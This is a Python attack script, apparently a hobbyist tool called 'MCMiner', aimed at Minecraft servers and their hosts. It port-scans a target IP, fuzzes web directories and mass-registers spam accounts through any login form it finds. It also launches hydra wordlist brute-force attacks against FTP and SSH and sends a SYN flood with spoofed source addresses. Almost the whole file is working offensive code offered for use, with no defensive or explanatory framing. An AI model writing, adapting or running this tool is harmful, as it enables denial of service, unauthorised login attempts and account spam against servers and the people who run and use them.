from colorama import Fore, init
import requests
from scapy.all import *
import socket
from random import randint
import threading
import time
import mechanize
import random
import string

from scapy.layers.inet import TCP, IP

Fore.LR = Fore.LIGHTRED_EX
Fore.LG = Fore.LIGHTGREEN_EX
Fore.W = Fore.LIGHTWHITE_EX
Fore.B = Fore.BLUE
Fore.LB = Fore.LIGHTBLUE_EX
Fore.R = Fore.RESET
Fore.Y = Fore.YELLOW
Fore.LBEX = Fore.LIGHTBLACK_EX
Fore.LWEX = Fore.LIGHTWHITE_EX
init()

dirs = ['database/', 'db/', 'imgs/', 'index.html', 'index.php', 'register/', 'login/', 'sql/', 'robots.txt',
        'credentials/', 'secret/', 'videos/', 'images/', 'js/', 'scripts/', 'style/', 'Login/', 'Register/',
        'logs/', 'users/', 'store/', 'transactions/', 'staff/', 'test/', 'tests/', 'css/', 'minecraft/',
        'rules/', 'vote/', 'search/', 'realms/', 'about/', '.htaccess', 'data/', 'logins/', 'admin/',
        'accounts/', 'access/', 'assets/', 'sitemap.xml', 'ghost/', 'p/', 'email/']

login_dirs = ['index.html', 'index.php', 'index.htm']

FTP = False
SSH = False
Website = False

os.system('title MCMiner by wfsec')
print(f'''

    {Fore.LG}        
    {Fore.GREEN}                ███╗   ███╗██╗███╗   ██╗███████╗██████╗ 
    {Fore.LG}                ████╗ ████║██║████╗  ██║██╔════╝██╔══██╗
    {Fore.GREEN}                ██╔████╔██║██║██╔██╗ ██║█████╗  ██████╔╝
    {Fore.LG}                ██║╚██╔╝██║██║██║╚██╗██║██╔══╝  ██╔══██╗
    {Fore.GREEN}                ██║ ╚═╝ ██║██║██║ ╚████║███████╗██║  ██║
    {Fore.LG}                ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝{Fore.R}                                                                        
    ''')

PORTS = {21: 'FTP',
         22: 'SSH',
         23: 'TELNET',
         53: 'DNS',
         80: 'HTTP',
         443: 'HTTPS',
         3389: 'RDP',
         8080: 'ALT HTTP',
         19312: 'Bedrock',
         25565: 'JavaServer'}


def syn_flood(dst_ip: str, dst_port: int):
    ip_packet = IP()
    ip_packet.src = ".".join(map(str, [randint(0, 255) for _ in range(4)]))
    ip_packet.dst = dst_ip

    tcp_packet = TCP()
    tcp_packet.sport = randint(1000, 9000)
    tcp_packet.dport = dst_port
    tcp_packet.flags = "S"
    tcp_packet.seq = randint(1000, 9000)
    tcp_packet.window = randint(1000, 9000)

    send(ip_packet / tcp_packet, verbose=0)


def ddos_threading():
    counter = int(input("               How many packets do you want to send: "))
    dst_ip = input("\n               Target IP: ")
    dst_port = int(input("               Target Port: "))

    print("               Packets are sending...")
    for i in range(counter):
        ddos_thread = threading.Thread(target=syn_flood, args=[dst_ip, dst_port], daemon=True)
        print(f'               {Fore.LB}[{i}]{Fore.W} Sent packet to {Fore.LIGHTYELLOW_EX}{dst_ip}:{dst_port}{Fore.W}')
        time.sleep(2)
        ddos_thread.start()
    print(f"\n               Total packets sent: {counter}\n")


ip = input('            IP: ')

print('')
print('')

for port in PORTS:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)  # Terminate connection if no response after 3 seconds
    result = s.connect_ex((ip, port))

    if result == 0:
        if port == 21:
            FTP = True
        if port == 22:
            SSH = True
        if port == 80:
            Website = True
        print(f'{Fore.LG}       [+]{Fore.W} Port {port} is open on [{ip}] {Fore.YELLOW}[{port}/{PORTS[port]}]{Fore.W}')
        s.close()
    else:
        print(
            f'{Fore.LR}       [-]{Fore.W} Port {port} is closed on [{ip}] {Fore.YELLOW}[{port}/{PORTS[port]}]{Fore.W}')
        s.close()

resp = requests.get(f'https://api.mcsrvstat.us/2/{ip}')  # Query the server status API
print('')

SRV = resp.json().get("srv")
SERVER_IP = resp.json().get("ip")
ONLINE_MODE = resp.json().get("online")
VERSION = resp.json().get("version")
QUERY = resp.json().get("query")

print(f'''
            {Fore.RED}Query:{Fore.R} {QUERY}
            {Fore.RED}Version:{Fore.R} {VERSION}
            {Fore.RED}Online Mode:{Fore.R} {ONLINE_MODE}
            {Fore.RED}Server IP:{Fore.R} {SERVER_IP}
            {Fore.RED}SRV:{Fore.R} {SRV}
''')


def fuzz(directory):
    fuzz_url = f'http://{ip}/{directory}'
    status = requests.get(fuzz_url, headers=user_agent).status_code

    if status == 200:
        meaning = '[OK]'
        color = Fore.LIGHTGREEN_EX
        if directory == 'login/':
            ask_spam = input(f'             Do you want to find more about "{directory}"? y/n: ')
            if ask_spam == 'y':

                for dir in login_dirs:
                    login_fuzz_url = f'http://{ip}/login/{dir}'
                    login_status = requests.get(str(login_fuzz_url), headers=user_agent).status_code

                    if login_status == 200:
                        meaning = '[OK]'
                        color = Fore.LIGHTGREEN_EX
                        print(f'            {color}[{login_status}] {meaning} {Fore.W} {login_fuzz_url}')
                        ask_account_creation = input('             Do you want to spam create accounts? y/n: ')
                        if ask_account_creation == 'y':
                            account_count = input('             How many accounts to create?: ')
                            url = login_fuzz_url

                            for _ in range(int(account_count)):
                                letters = string.ascii_lowercase
                                username = ''.join(random.choice(letters) for i in range(10))
                                email = ''.join(random.choice(letters) for i in range(10)).join('@gmail.com')
                                password = 'Fuck_you_lol!'
                                br = mechanize.Browser()
                                br.addheaders = [('User-agent',
                                                  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36')]
                                br.set_handle_robots(False)
                                br.open(url)

                                br.select_form(nr=0)

                                emailf = br.form.find_control(id="email")
                                emailf.value = email

                                usernamef = br.form.find_control(id="username")
                                usernamef.value = username

                                passwordf = br.form.find_control(id="password")
                                passwordf.value = password

                                confirmPasswordf = br.form.find_control(id="confirmPassword")
                                confirmPasswordf.value = password

                                br.submit()
                                time.sleep(1)
                                nexturl = br.geturl()
                                print(f'             {Fore.LG}[+]{Fore.W} Account created:{Fore.LB} {nexturl}{Fore.W}')

                    elif login_status == 404:
                        meaning = '[Not Found]'
                        color = Fore.LIGHTGREEN_EX
                        print(f'            {color}[{login_status}] {meaning} {Fore.W} {login_fuzz_url}')

                    else:
                        meaning = '[Unknown]'
                        color = Fore.LIGHTYELLOW_EX
                        print(f'            {color}[{login_status}] {meaning} {Fore.W} {login_fuzz_url}')

        elif directory == 'Login/':
            ask_spam2 = input(f'             Do you want to find more about "{directory}"? y/n: ')
            if ask_spam2 == 'y':

                for dir in login_dirs:
                    login_fuzz_url2 = f'http://{ip}/login/{dir}'
                    login_status2 = requests.get(str(login_fuzz_url2), headers=user_agent).status_code

                    if login_status2 == 200:
                        meaning = '[OK]'
                        color = Fore.LIGHTGREEN_EX
                        print(f'            {color}[{login_status2}] {meaning} {Fore.W} {login_fuzz_url2}')
                        ask_account_creation = input('             Do you want to spam create accounts? y/n: ')
                        if ask_account_creation == 'y':
                            account_count = input('             How many accounts to create?: ')
                            url = login_fuzz_url2

                            for _ in range(int(account_count)):
                                letters = string.ascii_lowercase
                                username = ''.join(random.choice(letters) for i in range(10))
                                email = ''.join(random.choice(letters) for i in range(10)).join('@gmail.com')
                                password = 'Fuck_you_lol!'
                                br = mechanize.Browser()
                                br.addheaders = [('User-agent',
                                                  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36')]
                                br.set_handle_robots(False)
                                br.open(url)

                                br.select_form(nr=0)

                                emailf = br.form.find_control(id="email")
                                emailf.value = email

                                usernamef = br.form.find_control(id="username")
                                usernamef.value = username

                                passwordf = br.form.find_control(id="password")
                                passwordf.value = password

                                confirmPasswordf = br.form.find_control(id="confirmPassword")
                                confirmPasswordf.value = password

                                br.submit()
                                time.sleep(1)
                                nexturl = br.geturl()
                                print(f'             {Fore.LG}[+]{Fore.W} Account created:{Fore.LB} {nexturl}{Fore.W}')

                    elif login_status2 == 404:
                        meaning = '[Not Found]'
                        color = Fore.LIGHTGREEN_EX
                        print(f'            {color}[{login_status2}] {meaning} {Fore.W} {login_fuzz_url2}')

                    else:
                        meaning = '[Unknown]'
                        color = Fore.LIGHTYELLOW_EX
                        print(f'            {color}[{login_status2}] {meaning} {Fore.W} {login_fuzz_url2}')

    elif status == 403:
        meaning = '[Forbidden]'
        color = Fore.LIGHTRED_EX

    elif status == 404:
        meaning = '[Not Found]'
        color = Fore.LIGHTRED_EX

    elif status == 429:
        meaning = '[Too Many Requests]'
        color = Fore.LIGHTYELLOW_EX

    else:
        meaning = ''
        color = Fore.LIGHTBLUE_EX
    print(f'            {color}[{status}] {meaning} {Fore.W} {fuzz_url}')

    time.sleep(0.1)


def threads_handler():
    for directory in dirs:
        fuzz_thread = threading.Thread(target=fuzz, args=(directory,), daemon=True)  # Starts the fuzzing thread
        time.sleep(0.8)
        fuzz_thread.start()


if Website:
    WebASK = input('            Do you want to information about website? y/n: ')
    if WebASK == 'y':
        user_agent = {
            'User-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060313 Debian/1.5.dfsg+1.5.0.1-4 Firefox/1.5.0.1'}
        r = requests.get(f'http://{ip}', headers=user_agent)
        print('')
        for res in r.history:
            print(f'            {Fore.LB}[{r.status_code}]{Fore.W} Redirected to{Fore.LWEX} {res.url}')
        d = requests.head(f'http://{ip}', headers=user_agent)
        print(f'''
                {Fore.LB}Server:{Fore.W} {d.headers["server"]}
                {Fore.LB}Content type:{Fore.W} {d.headers["content-type"]}
        ''')
        print('')

        fuzzask = input('            Do you want to fuzz the site? y/n: ')
        if fuzzask == 'y':
            threads_handler()
        else:
            print('               Ok.')
            print('')
    else:
        print('               Ok.')
        print('')

if FTP:
    print('')
    FTPASK = input('            Do you want to Wordlist attack on FTP? y/n: ')
    if FTPASK == 'y':
        the_proto = 'ftp'
        ftp_username_wordlist = input('             Username Wordlist: ')
        ftp_password_wordlist = input('             Password Wordlist: ')
        print('')
        os.system(f'hydra -L {ftp_username_wordlist} -P {ftp_password_wordlist} -I -V -t 4 -K {ip} {the_proto}')
    else:
        print('''               Ok.
                    ''')

if SSH:
    print('')
    SSHASK = input('             Do you want to Wordlist attack on SSH? y/n: ')
    if SSHASK == 'y':
        the_proto = 'ssh'
        ssh_username_wordlist = input('             Username Wordlist: ')
        ssh_password_wordlist = input('             Password Wordlist: ')
        print('')
        os.system(f'hydra -L {ssh_username_wordlist} -P {ssh_password_wordlist} -I -V -t 4 -K {ip} {the_proto}')
    else:
        print('''               Ok.
                    ''')

ddos_ask = input('            Do you want to send packets? y/n: ')
if ddos_ask == 'y':
    ddos_threading()
else:
    print('               Ok.')
    print('')
